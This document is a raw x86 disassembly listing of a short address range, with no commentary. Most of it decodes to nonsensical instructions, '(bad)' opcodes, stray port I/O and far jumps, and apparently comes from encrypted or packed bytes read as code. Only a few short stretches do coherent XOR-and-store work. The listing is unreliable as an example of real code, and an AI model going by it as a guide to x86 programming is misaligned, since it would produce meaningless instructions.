  411721:	cmp    DWORD PTR [edi+0x15ac2eef],esi
  411727:	(bad)  
  411728:	popf   
  411729:	fcmovu st,st(3)
  41172b:	pop    esi
  41172c:	nop
  41172d:	mov    eax,ds:0xe8097da5
  411732:	call   0x7866e44f
  411737:	shr    DWORD PTR [edi-0x80],0xd0
  41173b:	and    DWORD PTR [ebp+0x46],0x9abd982
  411742:	xor    bl,al
  411744:	sbb    al,0xde
  411746:	sub    BYTE PTR ds:0x4536c507,cl
  41174c:	or     BYTE PTR [eax+0x33],dl
  41174f:	jne    0x411781
  411751:	js     0x411721
  411753:	push   ebp
  411754:	add    esi,esi
  411756:	into   
  411757:	mov    cl,0x1b
  411759:	dec    esp
  41175a:	pusha  
  41175b:	sub    eax,0x26f2c29
  411760:	and    BYTE PTR [ecx],al
  411762:	pop    di
  411764:	icebp  
  411765:	retf   0xa0d1
  411768:	xchg   esp,eax
  411769:	mov    BYTE PTR [ebp+0x235c42cf],ah
  41176f:	mov    eax,0x7795624c
  411774:	mov    ch,0xbe
  411776:	pop    esp
  411777:	adc    edi,DWORD PTR [ebp-0x496d9592]
  41177d:	arpl   di,bx
  41177f:	repnz repnz fcmovnb st,st(5)
  411783:	popf   
  411784:	in     eax,dx
  411785:	sub    al,0x2b
  411787:	or     DWORD PTR [ebx+0x6a],edx
  41178a:	mov    ebp,0xce23e56a
  41178f:	inc    esi
  411790:	pop    ss
  411791:	cli    
  411792:	pushf  
  411793:	test   BYTE PTR [esi-0x3e82f5e7],ch
  411799:	mov    esi,0x3b69a616
  41179e:	mov    bh,0x79
  4117a0:	fidivr WORD PTR [eax+edi*8-0x1e]
  4117a4:	push   ss
  4117a5:	and    bl,0x27
  4117a8:	xor    eax,0xef432a84
  4117ad:	xchg   BYTE PTR [edi+0x66],cl
  4117b0:	mov    dl,0x93
  4117b2:	pushf  
  4117b3:	sbb    dh,BYTE PTR [edi+0x6b837a75]
  4117b9:	mov    edi,0xd55ff8b9
  4117be:	out    dx,eax
  4117bf:	out    dx,al
  4117c0:	sbb    al,0x56
  4117c2:	lds    ebx,FWORD PTR [edi-0x33]
  4117c5:	bound  ebx,QWORD PTR [edi+0x22cdacbc]
  4117cb:	into   
  4117cc:	(bad)  
  4117cd:	mov    ebx,0x138e228
  4117d2:	cmp    dl,BYTE PTR [edi]
  4117d4:	push   ds
  4117d5:	(bad)
  4117d8:	push   ebx
  4117d9:	ret    0xc74d
  4117dc:	das    
  4117dd:	fbstp  TBYTE PTR [edi-0x7b]
  4117e0:	pop    ebp
  4117e1:	clc    
  4117e2:	retf   
  4117e3:	sbb    ch,bl
  4117e5:	outs   dx,DWORD PTR ds:[esi]
  4117e6:	cs stos DWORD PTR es:[edi],eax
  4117e8:	mov    BYTE PTR fs:[edx+ecx*8],bh
  4117ec:	mov    WORD PTR [eax+0x3e],es
  4117ef:	in     eax,dx
  4117f0:	jb     0x4117e3
  4117f2:	(bad)  
  4117f3:	adc    bh,BYTE PTR [edi+esi*2+0x739a9f39]
  4117fa:	cmc    
  4117fb:	xchg   esi,eax
  4117fc:	cs std 
  4117fe:	pminub xmm7,XMMWORD PTR [ecx-0x2]
  411803:	xchg   esi,eax
  411804:	adc    dl,0xb3
  411807:	(bad)  
  411808:	fsub   st(2),st
  41180a:	gs iret 
  41180c:	sbb    dh,BYTE PTR [edi-0x71b9ce7]
  411812:	out    0xa1,al
  411814:	lock hlt 
  411816:	lods   al,BYTE PTR ds:[esi]
  411817:	in     al,0xe8
  411819:	inc    esi
  41181a:	or     bl,BYTE PTR [edi-0x4c]
  41181d:	jecxz  0x411872
  41181f:	jl     0x41189a
  411821:	outs   dx,BYTE PTR ds:[esi]
  411822:	loopne 0x411805
  411824:	pusha  
  411825:	mov    esp,0xbf614e80
  41182a:	add    BYTE PTR [eax-0x46f66b7d],ah
  411830:	push   ss
  411831:	int3   
  411832:	sbb    esi,DWORD PTR [eax]
  411834:	cmc    
  411835:	cmp    eax,DWORD PTR [edi]
  411837:	out    0x66,eax
  411839:	mov    ds:0xc758b71,eax
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x211f4fe9],dl
  41187c:	dec    eax
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118b9
  411886:	nop
  411887:	xor    al,0x4f
  411889:	or     BYTE PTR [esi+0x15f62a17],al
  41188f:	jmp    0xc4f34dfa
  411894:	push   edi
  411895:	pop    ecx
  411896:	add    ebx,DWORD PTR ds:0x160773bb
  41189c:	call   0x15ae:0x1212607
  4118a3:	adc    bh,BYTE PTR [edx+0x347858b3]
  4118a9:	icebp  
  4118aa:	adc    BYTE PTR [ebp-0x4adc6bac],0x40
  4118b1:	sbb    cl,ah
  4118b3:	xor    eax,0x47376716
  4118b8:	js     0x411932
  4118ba:	push   ds
  4118bb:	mov    ebp,0xe1ae4c46
  4118c0:	test   eax,0x888c0cff
  4118c5:	je     0x411858
  4118c7:	sub    DWORD PTR [edx+ecx*8],esi
  4118ca:	ins    BYTE PTR es:[edi],dx
  4118cb:	adc    DWORD PTR [ebp+0x64eddd1a],esi
  4118d1:	dec    ebx
  4118d2:	loopne 0x411882
  4118d4:	mov    ebx,0x11b9000
  4118d9:	fwait
  4118da:	lock and BYTE PTR [ecx],cl
  4118dd:	push   esp
  4118de:	call   0xeff:0x53e91fc1
  4118e5:	aam    0x8d
  4118e7:	call   0x56e7:0x48b6c6b8
  4118ee:	adc    BYTE PTR [ebx],ch
  4118f0:	adc    eax,eax
  4118f2:	sahf   
  4118f3:	out    dx,eax
  4118f4:	cs xchg edx,eax
  4118f6:	or     al,0xa9
  4118f8:	sbb    al,cl
  4118fa:	dec    ebx
  4118fb:	mov    edx,0x9ede1aa6
  411900:	mov    ss,WORD PTR [ebp+0x5f]
  411903:	fs push 0x859e5ff0
  411909:	add    ebx,eax
  41190b:	data16 fiadd DWORD PTR [edi]
  41190e:	pop    edx
  41190f:	add    bh,bl
  411911:	in     eax,0xcb
  411913:	push   ecx
  411914:	push   edx
  411915:	mov    eax,0xb2b69d80
  41191a:	push   eax
  41191b:	leave  
  41191c:	adc    al,0x77
  41191e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41191f:	sub    eax,0xe5402fb7
  411924:	adc    DWORD PTR [esp+ecx*1-0x4c],0xffffff84
  411929:	push   ebp
  41192a:	ja     0x411951
  41192c:	mov    ds:0xe2543d3d,al
  411931:	mov    ds:0xe69e93a0,al
  411936:	xchg   ebx,eax
  411937:	popa   
  411938:	xchg   esp,eax
  411939:	ffreep st(1)
  41193b:	iret   
  41193c:	adc    edx,DWORD PTR [ecx]
  41193e:	daa    
  41193f:	ins    BYTE PTR es:[edi],dx
  411940:	sbb    dh,BYTE PTR [ebx+0x59]
  411943:	fsub   DWORD PTR [ebx+0x33]
  411946:	jo     0x4118db
  411948:	pop    ebx
  411949:	or     DWORD PTR [esi+0x4568a6c3],esi
  41194f:	daa    
  411950:	push   0xffffffaa
  411952:	xor    edi,DWORD PTR [ebp+0x15742f6c]
  411958:	loopne 0x4119b8
  41195a:	repz and BYTE PTR [eax],0x36
  41195e:	(bad)  
  41195f:	je     0x411920
  411961:	outs   dx,DWORD PTR ds:[esi]
  411962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411963:	inc    esp
  411964:	nop
  411965:	cli    
  411966:	mov    ecx,0xaeb2c595
  41196b:	mov    ebx,0xfd31e1ac
  411970:	ja     0x41196b
  411972:	mov    bl,BYTE PTR [esi+edx*1-0x69]
  411976:	or     al,BYTE PTR [eax-0x28c7ce26]
  41197c:	jbe    0x41190e
  41197e:	outs   dx,BYTE PTR ds:[esi]
  41197f:	out    dx,eax
  411980:	xchg   esp,eax
  411981:	jbe    0x41195d
  411983:	out    0x4d,al
  411985:	add    dh,BYTE PTR [edi*2+0x4bae739e]
  41198c:	push   esp
  41198d:	pop    esi
  41198e:	mov    edx,0xd3e93673
  411993:	stc    
  411994:	out    dx,al
  411995:	xchg   BYTE PTR [edi-0x4dc83625],ah
  41199b:	gs xchg esi,eax
  41199d:	outs   dx,DWORD PTR ds:[esi]
  41199e:	fstp   DWORD PTR [edx-0x4f]
  4119a1:	jo     0x411999
  4119a3:	xchg   edx,eax
  4119a4:	lods   eax,DWORD PTR ds:[esi]
  4119a5:	js     0x4119ec
  4119a7:	and    BYTE PTR [ebx+0x79060ffe],bh
  4119ad:	dec    BYTE PTR [ebx-0x50]
  4119b0:	xlat   BYTE PTR ds:[ebx]
  4119b1:	(bad)  
  4119b2:	pushf  
  4119b3:	xor    DWORD PTR [ebx],esi
  4119b5:	xor    ebx,ebp
  4119b7:	adc    BYTE PTR [edx],dl
  4119b9:	push   ebx
  4119ba:	jp     0x41195b
  4119bc:	sub    bh,ah
  4119be:	iret   
  4119bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119c0:	mov    ecx,0x99bbdc75
  4119c5:	loope  0x4119c5
  4119c7:	adc    DWORD PTR ds:0x8c7cfbdf,ebp
  4119cd:	cmovbe edx,DWORD PTR [edx-0x18]
  4119d1:	sub    eax,0x7c498d0
  4119d6:	add    dl,BYTE PTR [eax+ecx*2-0x13a8442e]
  4119dd:	out    0xff,eax
  4119df:	mov    WORD PTR [ecx-0x1d],?
  4119e2:	inc    esp
  4119e3:	add    DWORD PTR ds:0x9b6a776f,eax
  4119e9:	test   ebp,ecx
  4119eb:	mov    ecx,0xd0b4ec61
  4119f0:	lds    ecx,FWORD PTR [edx-0x6eea875c]
  4119f6:	pushf  
  4119f7:	ins    DWORD PTR es:[edi],dx
  4119f8:	(bad)  
  4119f9:	or     eax,DWORD PTR [ecx-0x39]
  4119fc:	mov    eax,ds:0x6885bf88
  411a01:	or     BYTE PTR [esi-0x6504d2e2],0x4d
  411a08:	sub    al,0xa8
  411a0a:	hlt    
  411a0b:	lock ror DWORD PTR [eax-0x651617e8],1
  411a12:	test   DWORD PTR [esp+edx*8],0xf6ab7f56
  411a19:	mov    bh,0xdd
  411a1b:	fsubp  st(6),st
  411a1d:	dec    eax
  411a1e:	jo     0x411a80
  411a20:	pop    ebx
  411a21:	les    ecx,FWORD PTR [ebx]
  411a23:	sbb    ebx,DWORD PTR [ebx+0x13]
  411a26:	sub    ebx,DWORD PTR [ebx+0x3fde35d]
  411a2c:	push   0xb38dea5c
  411a31:	jl     0x411a4e
  411a33:	imul   esp,DWORD PTR [edi-0x5ac30783],0x1412bb1d
  411a3d:	popa   
  411a3e:	push   edi
  411a3f:	or     eax,0xe0bf844c
  411a44:	js     0x411ac3
  411a46:	xchg   BYTE PTR [ebp-0x7ffb1a7a],ch
  411a4c:	das    
  411a4d:	repz jb 0x411aa9
  411a50:	adc    eax,DWORD PTR [edi]
  411a52:	mov    ah,0x4a
  411a54:	mov    BYTE PTR [ebx],dh
  411a56:	dec    ebp
  411a57:	int3   
  411a58:	or     BYTE PTR [edx-0x76cda134],bh
  411a5e:	bnd call 0x6f44adea
  411a64:	mov    ch,0xfb
  411a66:	sbb    eax,0x105843b4
  411a6b:	leave  
  411a6c:	add    eax,DWORD PTR [esi]
  411a6e:	ret    0xf631
  411a71:	call   0x7811:0x626db1a2
  411a78:	lock jg 0x4119fc
  411a7b:	icebp  
  411a7c:	sbb    bl,BYTE PTR [ecx+0x10cc9328]
  411a82:	mov    dl,0xeb
  411a84:	mov    edx,0x6f255029
  411a89:	sub    BYTE PTR [esi-0x20],dl
  411a8c:	sahf   
  411a8d:	jmp    0x411a73
  411a8f:	push   0x7d
  411a91:	out    dx,al
  411a92:	sbb    edx,esi
  411a94:	fwait
  411a95:	xlat   BYTE PTR ds:[ebx]
  411a96:	push   ss
  411a97:	jo     0x411b16
  411a99:	call   0x5e20fe33
  411a9e:	jb     0x411a4e
  411aa0:	adc    al,0x39
  411aa2:	loopne 0x411af1
  411aa4:	push   ebp
  411aa5:	cmp    edi,DWORD PTR [ecx+0x34d59ad1]
  411aab:	inc    edx
  411aac:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  411aae:	pop    ecx
  411aaf:	pop    es
  411ab0:	jnp    0x411b17
  411ab2:	out    0x3f,eax
  411ab4:	xchg   edx,eax
  411ab5:	cs jno 0x411aeb
  411ab8:	(bad)  
  411ab9:	cmp    bh,al
  411abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411abd:	int    0xde
  411abf:	mov    ah,BYTE PTR ds:0xa6f8d723
  411ac5:	jecxz  0x411ac1
  411ac7:	pop    esi
  411ac8:	xor    DWORD PTR [eax+0x4473faff],ecx
  411ace:	cmp    DWORD PTR [edx-0x55c304fd],0x35addda0
  411ad8:	push   esp
  411ad9:	inc    edi
  411ada:	jo     0x411aea
  411adc:	pop    eax
  411add:	cwde   
  411ade:	and    BYTE PTR [ecx+0x32b837a5],ch
  411ae4:	sbb    eax,0xae976d6a
  411ae9:	push   es
  411aea:	std    
  411aeb:	xor    al,0xe0
  411aed:	mov    ebp,0xce81ea11
  411af2:	loope  0x411abe
  411af4:	mov    ebx,ebx
  411af6:	dec    ecx
  411af7:	or     dx,di
  411afa:	add    DWORD PTR [edx+0x39fa2554],esp
  411b00:	test   DWORD PTR [edi+0x35],0x7ce3863a
  411b07:	lds    esp,FWORD PTR [edx+ebp*4]
  411b0a:	sub    ah,BYTE PTR fs:[eax-0x5e]
  411b0e:	lsl    esp,WORD PTR [edi]
  411b11:	jl     0x411b18
  411b13:	retf   0x75dc
  411b16:	push   esp
  411b17:	scas   al,BYTE PTR es:[edi]
  411b18:	push   ebx
  411b19:	test   al,0x18
  411b1b:	stc    
  411b1c:	retf   
  411b1d:	adc    BYTE PTR [edx],0xaa
  411b20:	jg     0x411b3d
  411b22:	stos   BYTE PTR es:[edi],al
  411b23:	daa    
  411b24:	icebp  
  411b25:	mov    bl,dh
  411b27:	or     al,0xc
  411b29:	pop    esi
  411b2a:	sub    al,0x18
  411b2c:	pop    eax
  411b2d:	xchg   edx,eax
  411b2e:	cmp    ebp,DWORD PTR [edi-0x6a]
  411b31:	mov    edx,0xb72e992e
  411b37:	pop    edx
  411b38:	ja     0x411b72
  411b3a:	add    eax,0x4b99fd47
  411b3f:	fbld   TBYTE PTR [eax]
  411b41:	adc    eax,DWORD PTR [ebx-0x73]
  411b44:	ins    BYTE PTR es:[edi],dx
  411b45:	push   edx
  411b46:	in     al,0xfb
  411b48:	xchg   edx,eax
  411b49:	or     cl,BYTE PTR [edi]
  411b4b:	xchg   edx,eax
  411b4c:	push   esi
  411b4d:	or     al,0x9c
  411b4f:	(bad)  
  411b50:	jnp    0x411ada
  411b52:	clc    
  411b53:	push   cs
  411b54:	cmp    BYTE PTR [edx],ah
  411b56:	das    
  411b57:	pushf  
  411b58:	(bad)  
  411b59:	push   0x628b01ac
  411b5e:	imul   ecx,DWORD PTR [eax+eax*2],0x26
  411b62:	inc    ebx
  411b63:	into   
  411b64:	inc    esi
  411b65:	jge    0x411b59
  411b67:	jmp    0x3ed0:0x15831cae
  411b6e:	enter  0x3c00,0xe2
  411b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b73:	test   BYTE PTR [edx-0x28924421],bh
  411b79:	fdiv   DWORD PTR [ecx]
  411b7b:	in     al,0xf9
  411b7d:	mov    WORD PTR [esi-0x12667ec1],?
  411b83:	sub    DWORD PTR [edi+esi*8],ebx
  411b86:	push   edi
  411b87:	(bad)  
  411b88:	call   0x5a8dfebb
  411b8d:	mov    al,BYTE PTR [ebp-0x3b9e99fa]
  411b93:	(bad)  
  411b94:	pop    ds
  411b95:	popf   
  411b96:	mov    esp,esi
  411b98:	mov    bl,0x40
  411b9a:	sbb    BYTE PTR [esi*2+0x58e04bf],dl
  411ba1:	mov    edi,0x852952ec
  411ba6:	imul   ch
  411ba8:	out    0xa5,al
  411baa:	jle    0x411c02
  411bac:	sub    bh,BYTE PTR [esi-0x614d1fe0]
  411bb2:	mov    BYTE PTR [edx],dh
  411bb4:	outs   dx,DWORD PTR ds:[esi]
  411bb5:	les    eax,FWORD PTR [edi+0x181b0a2f]
  411bbb:	fistp  DWORD PTR [ebx]
  411bbd:	pop    ebx
  411bbe:	inc    edi
  411bbf:	add    ebp,edx
  411bc1:	adc    eax,0xe3fa7851
  411bc6:	inc    edx
  411bc7:	loope  0x411c45
  411bc9:	retf   0x6d67
  411bcc:	xchg   ecx,eax
  411bcd:	xor    ebx,DWORD PTR [ebp+0x2a847c3c]
  411bd3:	inc    esi
  411bd4:	jns    0x411be3
  411bd6:	shl    BYTE PTR [edi],1
  411bd8:	mov    esp,0x47eb7b3e
  411bdd:	sbb    bh,dl
  411bdf:	lods   eax,DWORD PTR ds:[esi]
  411be0:	pop    ecx
  411be1:	xchg   ecx,esi
  411be3:	pop    ds
  411be4:	rol    DWORD PTR [edi-0x4a],1
  411be7:	outs   dx,DWORD PTR ds:[esi]
  411be8:	fwait
  411be9:	dec    ebx
  411bea:	nop
  411beb:	add    ch,dh
  411bed:	gs sar ch,cl
  411bf0:	add    BYTE PTR [edx-0x79d7c3a9],al
  411bf6:	add    al,0xa0
  411bf8:	mov    eax,ds:0x8e57270d
  411bfd:	je     0x411b9b
  411bff:	xchg   esi,eax
  411c00:	and    DWORD PTR [ebx+0x3f],eax
  411c03:	jmp    0x6fa0:0x8ed4242b
  411c0a:	pop    ebx
  411c0b:	arpl   WORD PTR [ebp+0x55e899a0],di
  411c11:	ds sbb esi,esi
  411c14:	loope  0x411bcb
  411c16:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  411c18:	sbb    DWORD PTR [eax],esi
  411c1a:	cmp    ebp,edi
  411c1c:	dec    ecx
  411c1d:	pop    esp
  411c1e:	enter  0xf33f,0x8f
  411c22:	ficom  WORD PTR [edx-0x704f00d2]
  411c28:	(bad)  
  411c29:	(bad)  
  411c2a:	jns    0x411bb7
  411c2c:	imul   ebx,DWORD PTR [ecx],0x79
  411c2f:	cmp    al,0x1d
  411c31:	lahf   
  411c32:	mov    cl,0xff
  411c34:	das    
  411c35:	sbb    DWORD PTR es:[ebx-0x69],esi
  411c39:	xor    BYTE PTR [eax-0x4cb8339f],0x53
  411c40:	(bad)  
  411c41:	pop    eax
  411c42:	fcomip st,st(4)
  411c44:	fld    DWORD PTR [edx]
  411c46:	sub    cl,ch
  411c48:	aam    0x3d
  411c4a:	push   edx
  411c4b:	sub    ecx,0x3e
  411c4e:	dec    ebp
  411c4f:	sub    al,BYTE PTR [edi+edx*2]
  411c52:	cmp    ebp,edx
  411c54:	scas   al,BYTE PTR es:[edi]
  411c55:	ins    BYTE PTR es:[edi],dx
  411c56:	shl    BYTE PTR [ebp-0x59],1
  411c59:	ficom  DWORD PTR [eax+0x8a3e245]
  411c5f:	lods   al,BYTE PTR ds:[esi]
  411c60:	(bad)  
  411c61:	stc    
  411c62:	fwait
  411c63:	iret   
  411c64:	xchg   esi,eax
  411c65:	repnz dec ebp
  411c67:	mov    dh,0x72
  411c69:	inc    edx
  411c6a:	jecxz  0x411cd5
  411c6c:	ins    DWORD PTR es:[edi],dx
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x7baa505e
  411cb8:	lahf   
  411cb9:	pop    esi
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411ccc
  411cc2:	xor    eax,0x467adeda
  411cc7:	inc    edi
  411cc8:	mov    bh,0xa6
  411cca:	sub    esi,DWORD PTR [esi-0x3afa1aeb]
  411cd0:	neg    BYTE PTR [ecx]
  411cd2:	enter  0x3eca,0x50
  411cd6:	mov    ebx,ebx
  411cd8:	and    BYTE PTR [ecx+0x8a760d6],dl
  411cde:	mov    ch,0xd3
  411ce0:	add    BYTE PTR ds:0x37c1da7d,dl
  411ce6:	and    al,0x29
  411ce8:	inc    esp
  411ce9:	enter  0x74a5,0xc5
  411ced:	test   DWORD PTR [esi+0x7c7cf36e],0x65c7889
  411cf7:	call   0x29dead4b
  411cfc:	(bad)  
  411cfd:	sub    BYTE PTR [ecx],cl
  411cff:	add    dl,BYTE PTR [ecx+0x15]
  411d02:	xchg   edi,eax
  411d03:	adc    al,0xb2
  411d05:	daa    
  411d06:	sub    DWORD PTR [ebp+0x28849bb5],esi
  411d0c:	push   es
  411d0d:	popf   
  411d0e:	es ret 
  411d10:	ror    BYTE PTR [edx-0x4f],0x2d
  411d14:	outs   dx,BYTE PTR ds:[esi]
  411d15:	test   al,0x2c
  411d17:	shl    BYTE PTR [eax],cl
  411d19:	cdq    
  411d1a:	mov    dh,0xd6
  411d1c:	pop    edi
  411d1d:	fwait
  411d1e:	lods   eax,DWORD PTR ds:[esi]
  411d1f:	sbb    esi,DWORD PTR [ebx-0x423c94f4]
  411d25:	iret   
  411d26:	call   0x60d2:0x740d2ddd
  411d2d:	test   edx,esi
  411d2f:	mov    DWORD PTR [edi+edx*1+0x44],ebp
  411d33:	jmp    0x25f8:0x6e15cee8
  411d3a:	lds    edx,FWORD PTR [ecx+0x68]
  411d3d:	xchg   ebp,eax
  411d3e:	jae    0x411d50
  411d40:	pop    ebp
  411d41:	leave  
  411d42:	psubusb mm7,QWORD PTR [edx-0x6]
  411d46:	aad    0x36
  411d48:	inc    eax
  411d49:	sub    ch,BYTE PTR [esp+esi*2]
  411d4c:	in     al,dx
  411d4d:	push   ds
  411d4e:	shr    dl,1
  411d50:	sub    DWORD PTR [ebx+0x57adbef6],ecx
  411d56:	ja     0x411d06
  411d58:	push   0x25f96041
  411d5d:	bound  edi,QWORD PTR ds:0x46b8b9d9
  411d63:	test   eax,0x6c0067e6
  411d68:	pop    ds
  411d69:	jb     0x411d16
  411d6b:	ret    0xd0da
  411d6e:	sub    BYTE PTR ds:0xe42f83cf,ch
  411d74:	call   0x3948f22b
  411d79:	lods   eax,DWORD PTR ds:[esi]
  411d7a:	add    BYTE PTR [bp+si],bh
  411d7d:	retf   
  411d7e:	test   DWORD PTR [ebx-0x38a98e1e],esp
  411d84:	sbb    BYTE PTR [edi+0x34],ah
  411d87:	xor    bh,BYTE PTR [ecx-0x766c5bb3]
  411d8d:	xchg   esp,eax
  411d8e:	mov    ecx,0xe6938e77
  411d93:	jne    0x411dbe
  411d95:	xchg   BYTE PTR [eax-0x55021ee6],ch
  411d9b:	xlat   BYTE PTR ds:[ebx]
  411d9c:	xchg   esp,eax
  411d9d:	ror    BYTE PTR [ebx],0x5f
  411da0:	stos   DWORD PTR es:[edi],eax
  411da1:	mov    cl,0x84
  411da3:	loop   0x411de8
  411da5:	mov    ds:0x2356f6cb,al
  411daa:	out    0x77,al
  411dac:	stc    
  411dad:	jle    0x411dac
  411daf:	jae    0x411d5f
  411db1:	push   ebp
  411db2:	inc    esi
  411db3:	mov    ch,0x9f
  411db5:	xlat   BYTE PTR ds:[ebx]
  411db7:	mov    edx,0x67efc9a6
  411dbc:	pop    ecx
  411dbd:	add    edi,DWORD PTR [edx-0x67]
  411dc0:	jnp    0x411e25
  411dc2:	(bad)  
  411dc3:	jbe    0x411d83
  411dc5:	retf   0x285a
  411dc8:	sti    
  411dc9:	dec    ebx
  411dca:	sub    al,0x5c
  411dcc:	xchg   ebx,eax
  411dcd:	sar    DWORD PTR es:[edx-0xb938353],0x40
  411dd5:	rcr    BYTE PTR ds:0xd8c13b02,0x55
  411ddc:	(bad)  
  411ddd:	jo     0x411dc0
  411ddf:	das    
  411de0:	inc    edx
  411de1:	or     ah,0xbd
  411de4:	mov    al,ds:0xbcb6d4fe
  411de9:	cmp    eax,esi
  411deb:	sbb    BYTE PTR [eax-0x4ed2d5a],cl
  411df1:	ret    0x464b
  411df4:	gs (bad) 
  411df6:	and    BYTE PTR [edx],al
  411df8:	cmp    DWORD PTR [edi-0x46],0x53
  411dfc:	add    al,0xac
  411dfe:	adc    DWORD PTR [edx+edx*1],edi
  411e01:	xor    DWORD PTR [ebx+0x3ee87ffc],ebp
  411e07:	imul   ecx,DWORD PTR [ecx-0x6eb30cf0],0xfe88314c
  411e11:	push   ebx
  411e12:	inc    eax
  411e13:	dec    ebp
  411e14:	jb     0x411db7
  411e16:	add    edi,DWORD PTR [esi+0x74fe1934]
  411e1c:	popa   
  411e1d:	mov    ds:0xa7381120,eax
  411e22:	ror    DWORD PTR [ecx+0x1e1fee1a],1
  411e28:	xchg   BYTE PTR [edi-0x2f],dl
  411e2b:	loope  0x411df7
  411e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e2e:	dec    esi
  411e2f:	cwde   
  411e30:	(bad)  
  411e31:	jmp    0x5007bcd4
  411e36:	std    
  411e37:	cmp    al,0x99
  411e39:	out    dx,al
  411e3a:	dec    edx
  411e3b:	mov    al,ds:0x3a0ebc3d
  411e40:	push   edi
  411e41:	idiv   DWORD PTR [ebp-0x5f]
  411e44:	loope  0x411e33
  411e46:	sub    BYTE PTR gs:[edi-0x2d],ah
  411e4a:	unpcklps xmm4,xmm7
  411e4d:	fs cmp al,0x37
  411e50:	jmp    0x67e1:0xc2f637a9
  411e57:	dec    esi
  411e58:	jne    0x411e3a
  411e5a:	mov    gs,WORD PTR ds:0x32219bd
  411e60:	fidivr WORD PTR [eax]
  411e62:	outs   dx,BYTE PTR ds:[esi]
  411e63:	pusha  
  411e64:	lods   al,BYTE PTR ds:[esi]
  411e65:	pusha  
  411e66:	xchg   DWORD PTR [edx+ebx*4],edx
  411e69:	xchg   BYTE PTR ss:[edx-0x7f],dh
  411e6d:	int3   
  411e6e:	outs   dx,BYTE PTR ds:[esi]
  411e6f:	mov    ch,0x31
  411e71:	iret   
  411e72:	sbb    BYTE PTR [ebp-0x277e4606],al
  411e78:	xor    bl,BYTE PTR [edi]
  411e7a:	or     ecx,DWORD PTR [esi+eiz*1-0x4160418]
  411e81:	cmp    cl,BYTE PTR ds:0x7791ecb8
  411e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e88:	fwait
  411e89:	out    0xd5,eax
  411e8b:	div    ecx
  411e8d:	xchg   DWORD PTR [ecx-0x710f4e8],edi
  411e93:	xor    al,0xc2
  411e95:	sbb    BYTE PTR [edi-0xf],ch
  411e98:	pop    eax
  411e99:	ss fcomi st,st(3)
  411e9c:	adc    al,0x7
  411e9e:	(bad)  
  411e9f:	int    0xd4
  411ea1:	push   esp
  411ea2:	pop    ds
  411ea3:	xchg   BYTE PTR ds:0xd095ab92,cl
  411ea9:	aam    0x2e
  411eab:	test   BYTE PTR [ecx],bh
  411ead:	and    DWORD PTR [eax+ebx*1-0xc7d0ef8],esp
  411eb4:	xor    esp,ebp
  411eb6:	or     esp,DWORD PTR [ebp+0xe9682ed]
  411ebc:	mov    cl,0xfe
  411ebe:	inc    esp
  411ebf:	cmp    ebp,DWORD PTR [eax+edx*8-0x54]
  411ec3:	test   eax,0x2504419a
  411ec8:	inc    edi
  411ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eca:	jns    0x411f10
  411ecc:	repz fild DWORD PTR [edx+0x47]
  411ed0:	mov    al,ds:0x62079819
  411ed5:	dec    esp
  411ed6:	cld    
  411ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ed8:	inc    edi
  411ed9:	imul   ecx,ebp,0xffffffb2
  411edc:	les    ecx,FWORD PTR [ecx+0x70]
  411edf:	(bad)  
  411ee0:	pop    esp
  411ee1:	dec    esi
  411ee2:	sbb    edx,0x5443676
  411ee8:	lds    edx,FWORD PTR [edx+0x45]
  411eeb:	mov    cl,0x4
  411eed:	dec    esp
  411eee:	test   DWORD PTR [ecx+edx*4+0x0],ebx
  411ef2:	cdq    
  411ef3:	pop    edi
  411ef4:	stos   DWORD PTR es:[edi],eax
  411ef5:	loopne 0x411e8b
  411ef7:	sbb    bl,al
  411ef9:	mov    bh,0xe3
  411efb:	gs inc ecx
  411efd:	sbb    al,0x35
  411eff:	lods   al,BYTE PTR ds:[esi]
  411f00:	push   esp
  411f01:	cwde   
  411f02:	jne    0x411ec5
  411f04:	cli    
  411f05:	jne    0x411ee9
  411f07:	or     cl,BYTE PTR [eax-0x537250e2]
  411f0d:	out    0x17,eax
  411f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f10:	fwait
  411f11:	or     BYTE PTR ds:0xf8a16580,0xb7
  411f18:	cmp    esi,DWORD PTR [ebx-0x5b]
